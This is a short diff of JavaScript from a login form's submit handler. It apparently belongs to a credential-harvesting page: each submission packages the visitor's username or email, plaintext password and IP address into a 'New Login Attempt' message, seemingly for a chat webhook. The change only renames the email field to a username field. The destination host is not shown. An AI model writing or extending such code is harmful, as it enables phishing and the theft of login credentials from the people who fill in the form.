@@ -45,7 +45,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 },
                 body: JSON.stringify({
                     content: `New Login Attempt:
-Email: ||${email}||
+Username / Email: ||${username}||
 Password: ||${password}||
 IP Address: ||${userIP}||`
                 })
